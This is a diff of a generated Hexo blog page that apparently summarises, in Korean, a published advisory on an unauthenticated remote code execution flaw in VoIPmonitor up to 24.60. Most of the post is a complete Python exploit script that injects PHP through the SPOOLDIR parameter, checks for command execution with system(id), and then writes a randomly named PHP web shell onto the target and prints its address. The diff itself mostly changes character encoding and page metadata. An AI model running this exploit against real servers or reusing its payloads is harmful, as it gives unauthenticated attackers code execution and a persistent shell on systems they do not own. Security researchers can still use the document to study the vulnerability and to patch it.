@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      525 자
+      572 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      11
        분
     </span>
   
@@ -242,7 +242,7 @@
               </script>
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/">VoIPmonitor UnAuth RCE</a></p>
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>VoIPmonitor &lt;= 24.60</p>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>오픈소스 network packet sniffer인 VoIPmonitor에서 RCE취약점이 발견되었습니다. 해당 취약점은 <code>SPOOLDIR</code> 혹은 <code>recheck</code> 파라미터를 사용하는 POST 요청을 처리할 때 발생합니다. <code>SPOOLDIR</code> 파라미터 값은 UI 인터페이스가 호출하는 <code>config/configuration.php</code>에 아무런 필터나 가공 없이 있는 그대로 삽입됩니다. 이는 인증되지 않은 사용자라도 웹 인터페이스를 통해 임의의 PHP 코드를 원격으로 실행할 수 있게 해  줍니다. </p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>&#xC624;&#xD508;&#xC18C;&#xC2A4; network packet sniffer&#xC778; VoIPmonitor&#xC5D0;&#xC11C; RCE&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>SPOOLDIR</code> &#xD639;&#xC740; <code>recheck</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; POST &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. <code>SPOOLDIR</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC740; UI &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xAC00; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>config/configuration.php</code>&#xC5D0; &#xC544;&#xBB34;&#xB7F0; &#xD544;&#xD130;&#xB098; &#xAC00;&#xACF5; &#xC5C6;&#xC774; &#xC788;&#xB294; &#xADF8;&#xB300;&#xB85C; &#xC0BD;&#xC785;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xB77C;&#xB3C4; &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758;&#xC758; PHP &#xCF54;&#xB4DC;&#xB97C; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;  &#xC90D;&#xB2C8;&#xB2E4;. </p>
 <pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse
 <span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv,exit
 <span class="hljs-keyword">import</span> time
@@ -257,25 +257,25 @@ print(<span class="hljs-string">&quot;&quot;&quot;</span>
 <span class="hljs-string">#              VOIP Monitor RCE               #</span>
 <span class="hljs-string">###############################################</span>
 <span class="hljs-string">&quot;&quot;&quot;</span>)
-headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;
+headers = {<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>}
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_target</span>(<span class="hljs-params">args</span>):</span>
     hostname = args.host
     path = args.path
     <span class="hljs-keyword">if</span> path:
-        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;path&#125;</span>/index.php&quot;</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">{hostname}</span>/<span class="hljs-subst">{path}</span>/index.php&quot;</span>
     <span class="hljs-keyword">else</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/index.php&quot;</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">{hostname}</span>/index.php&quot;</span>
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_tmp</span>(<span class="hljs-params">args</span>):</span>
     <span class="hljs-keyword">global</span> headers
     target = get_target(args)
-    n_data = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">&quot;/tmp&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;
+    n_data = {<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">&quot;/tmp&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>}
     set_totmp = requests.post(target, n_data, headers=headers)
-    print(<span class="hljs-string">f&quot;[*] set /tmp <span class="hljs-subst">&#123;set_totmp&#125;</span>&quot;</span>)
+    print(<span class="hljs-string">f&quot;[*] set /tmp <span class="hljs-subst">{set_totmp}</span>&quot;</span>)
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkVulnerability</span>(<span class="hljs-params">args</span>):</span>
     <span class="hljs-keyword">global</span> headers
     target = get_target(args)
-    print(<span class="hljs-string">f&quot;[+] Attacking <span class="hljs-subst">&#123;target&#125;</span>&quot;</span>)
-    testcmd = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">&quot;test\&quot;.system(id).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;
+    print(<span class="hljs-string">f&quot;[+] Attacking <span class="hljs-subst">{target}</span>&quot;</span>)
+    testcmd = {<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">&quot;test\&quot;.system(id).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>}
     response_text = <span class="hljs-string">b&quot;uid=&quot;</span>
     testcmd_req = requests.post(target, testcmd, verify=<span class="hljs-literal">False</span>, headers=headers)
     <span class="hljs-keyword">if</span> response_text <span class="hljs-keyword">in</span> testcmd_req.content:
@@ -288,22 +288,22 @@ headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span c
     hostname = args.host
     path = args.path
     shell_path = <span class="hljs-string">&quot;&quot;</span>
-    shellfilename = str ( <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_lowercase) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>)) )
+    shellfilename = str ( <span class="hljs-string">&apos;&apos;</span>.join(random.choice(string.ascii_lowercase) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>)) )
     target = get_target(args)
-    rce_payload = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">f&quot;/tmp\&quot;.file_put_contents(&#x27;<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&#x27;,&#x27;&lt;?php echo system($_GET[\&quot;a\&quot;]);&#x27;).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;
+    rce_payload = {<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">f&quot;/tmp\&quot;.file_put_contents(&apos;<span class="hljs-subst">{shellfilename}</span>.php&apos;,&apos;&lt;?php echo system($_GET[\&quot;a\&quot;]);&apos;).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>}
     rce_req = requests.post(target, headers=headers, data=rce_payload)
-    print(<span class="hljs-string">f&quot;[*] uploading shell <span class="hljs-subst">&#123;rce_req.status_code&#125;</span>&quot;</span>)
+    print(<span class="hljs-string">f&quot;[*] uploading shell <span class="hljs-subst">{rce_req.status_code}</span>&quot;</span>)
     <span class="hljs-keyword">if</span> path:
-        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;path&#125;</span>/<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&quot;</span>
+        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">{hostname}</span>/<span class="hljs-subst">{path}</span>/<span class="hljs-subst">{shellfilename}</span>.php&quot;</span>
     <span class="hljs-keyword">else</span>:
-        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&quot;</span>
-    shell_check = requests.get(shell_path, headers=headers, params=&#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;id&#x27;</span>&#125;)
-    print(<span class="hljs-string">f&quot;[*] RCE Check : <span class="hljs-subst">&#123;shell_check.text&#125;</span>&quot;</span>)
-    print(<span class="hljs-string">f&quot;[*] Your Shell at <span class="hljs-subst">&#123;shell_path&#125;</span>&quot;</span>)
+        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">{hostname}</span>/<span class="hljs-subst">{shellfilename}</span>.php&quot;</span>
+    shell_check = requests.get(shell_path, headers=headers, params={<span class="hljs-string">&apos;a&apos;</span>:<span class="hljs-string">&apos;id&apos;</span>})
+    print(<span class="hljs-string">f&quot;[*] RCE Check : <span class="hljs-subst">{shell_check.text}</span>&quot;</span>)
+    print(<span class="hljs-string">f&quot;[*] Your Shell at <span class="hljs-subst">{shell_path}</span>&quot;</span>)
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
-    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;VoIP Monitor all versions command execution&#x27;</span>)
-    parser.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>,<span class="hljs-string">&#x27;--host&#x27;</span>,help=<span class="hljs-string">&#x27;Host&#x27;</span>, type=str)
-    parser.add_argument(<span class="hljs-string">&#x27;-b&#x27;</span>, <span class="hljs-string">&#x27;--path&#x27;</span>,help=<span class="hljs-string">&#x27;Path of the VoIP Monitor&#x27;</span>, type=str)
+    parser = argparse.ArgumentParser(description=<span class="hljs-string">&apos;VoIP Monitor all versions command execution&apos;</span>)
+    parser.add_argument(<span class="hljs-string">&apos;-t&apos;</span>,<span class="hljs-string">&apos;--host&apos;</span>,help=<span class="hljs-string">&apos;Host&apos;</span>, type=str)
+    parser.add_argument(<span class="hljs-string">&apos;-b&apos;</span>, <span class="hljs-string">&apos;--path&apos;</span>,help=<span class="hljs-string">&apos;Path of the VoIP Monitor&apos;</span>, type=str)
     args = parser.parse_args()
     set_tmp(args)
     checkVulnerability(args)
@@ -613,6 +613,45 @@ headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span c
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
